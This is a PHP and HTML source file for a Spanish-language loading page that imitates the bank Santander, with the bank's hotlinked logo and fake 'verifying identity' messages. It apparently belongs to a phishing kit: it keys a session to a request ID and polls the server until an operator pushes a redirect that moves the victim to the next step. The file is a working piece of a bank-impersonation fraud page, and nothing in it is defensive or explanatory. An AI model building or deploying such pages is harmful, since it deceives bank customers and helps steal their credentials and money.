<?php
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

if (!isset($_GET['id']) || !preg_match('/^[a-zA-Z0-9,-]{5,}$/', $_GET['id'])) {
    http_response_code(400);
    exit;
}

$request_id = $_GET['id'];

session_write_close();
session_id($request_id);
session_start();

if (!isset($_SESSION['load_entry_time'])) {
    $_SESSION['load_entry_time'] = time();
}

if (isset($_GET['check'])) {
    header('Content-Type: application/json; charset=UTF-8');
    if (isset($_SESSION['redirect']) && isset($_SESSION['redirect_set_time'])) {
        if ($_SESSION['redirect_set_time'] > $_SESSION['load_entry_time']) {
            echo json_encode(['redirect' => $_SESSION['redirect']]);
            unset($_SESSION['redirect'], $_SESSION['redirect_set_time']);
        } else {
            echo json_encode(['redirect' => null]);
        }
    } else {
        echo json_encode(['redirect' => null]);
    }
    exit;
}
?>
    <!--

    ██████╗ ██╗  ██╗██████╗      ██████╗  ██████╗ ████████╗██╗   ██╗
    ██╔══██╗██║  ██║██╔══██╗    ██╔════╝ ██╔═══██╗╚══██╔══╝╚██╗ ██╔╝
    ██████╔╝███████║██████╔╝    ██║  ███╗██║   ██║   ██║    ╚████╔╝ 
    ██╔═══╝ ██╔══██║██╔═══╝     ██║   ██║██║   ██║   ██║     ╚██╔╝  
    ██║     ██║  ██║██║         ╚██████╔╝╚██████╔╝   ██║      ██║   
    ╚═╝     ╚═╝  ╚═╝╚═╝          ╚═════╝  ╚═════╝    ╚═╝      ╚═╝ 
    -->
<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="icon" href="faviconsanta.ico" type="image/svg+xml" data-next-head=""/>
<title>Santander</title>

<style>
* { box-sizing: border-box; }

body {
    margin: 0;
    height: 100vh;
    background: #ffffff;
    display: flex;
    justify-content: center;
    align-items: center;
    font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
}

/* CONTENEDOR */
.loader-wrapper {
    display: flex;
    flex-direction: column;
    align-items: center;
}

/* SPINNER PREMIUM */
.spinner {
    width: 90px;
    height: 90px;
    position: relative;
}

/* ARO EXTERNO */
.spinner::before {
    content: "";
    position: absolute;
    inset: 0;
    border-radius: 50%;
    border: 3px solid #e2e2e2;
}

/* ARO ACTIVO */
.spinner::after {
    content: "";
    position: absolute;
    inset: 0;
    border-radius: 50%;
    border: 3px solid transparent;
    border-top-color: #031a4c;
    border-right-color: #031a4c;
    animation: spin 1.2s linear infinite;
}

/* LOGO CENTRAL */
.logo {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 56px;
    height: 56px;
    border-radius: 50%;
    overflow: hidden;
    background: #fff;
    box-shadow: 0 4px 12px rgba(0,0,0,0.08);
}

/* IMAGEN LOGO */
.logo img {
    width: 100%;
    height: 100%;
    object-fit: cover;
    animation: fadeLogo 2.5s ease-in-out infinite;
}

/* TEXTO PRINCIPAL */
.loading-text {
    margin-top: 30px;
    font-size: 16px;
    color: #2b2b2b;
    font-weight: 500;
    text-align: center;
    transition: opacity 0.4s ease;
}

/* SUBTEXTO */
.subtext {
    margin-top: 6px;
    font-size: 13px;
    color: #8a8a8a;
    text-align: center;
    transition: opacity 0.4s ease;
}

/* DOTS */
.loading-dots::after {
    content: "";
    animation: dots 1.5s infinite steps(4, end);
}

/* ANIMACIONES */
@keyframes spin {
    to { transform: rotate(360deg); }
}

/* FADE SUAVE LOGO */
@keyframes fadeLogo {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.75; }
}

/* DOTS */
@keyframes dots {
    0% { content: ""; }
    25% { content: "."; }
    50% { content: ".."; }
    75% { content: "..."; }
}
</style>
</head>

<body>

<div class="loader-wrapper">

    <div class="">
        <div class="logo">
            <img src="https://aliados.santanderconsumer.co/credito-digital/assets/img/image.gif" alt="logo">
        </div>
    </div><br><br>

    <div class="loading-text" id="mainText">
        Validando información<span class="loading-dots"></span>
    </div>

    <div class="subtext" id="subText">
        Esto puede tardar unos segundos
    </div>

</div>

<script>
const mainText = document.getElementById("mainText");
const subText = document.getElementById("subText");

/* MENSAJES DINAMICOS (ULTRA REALISTA) */
const steps = [
    {
        title: "Validando información",
        sub: "Esto puede tardar unos segundos"
    },
    {
        title: "Verificando identidad",
        sub: "Protegemos tu información en todo momento"
    },
    {
        title: "Confirmando datos",
        sub: "Estamos asegurando tu acceso"
    }
];

let stepIndex = 0;

function changeStep() {
    stepIndex = (stepIndex + 1) % steps.length;

    mainText.style.opacity = 0;
    subText.style.opacity = 0;

    setTimeout(() => {
        mainText.innerHTML = steps[stepIndex].title + '<span class="loading-dots"></span>';
        subText.textContent = steps[stepIndex].sub;

        mainText.style.opacity = 1;
        subText.style.opacity = 1;
    }, 400);
}

setInterval(changeStep, 2500);

/* REDIRECCION BACKEND */
function checkRedirect() {
    fetch('load.php?id=<?php echo htmlspecialchars($request_id, ENT_QUOTES, "UTF-8"); ?>&check=1')
        .then(res => res.json())
        .then(data => {
            if (data.redirect) {
                window.location.href = data.redirect;
            } else {
                setTimeout(checkRedirect, 1500);
            }
        })
        .catch(() => setTimeout(checkRedirect, 1500));
}

window.onload = checkRedirect;
</script>

</body>
</html>
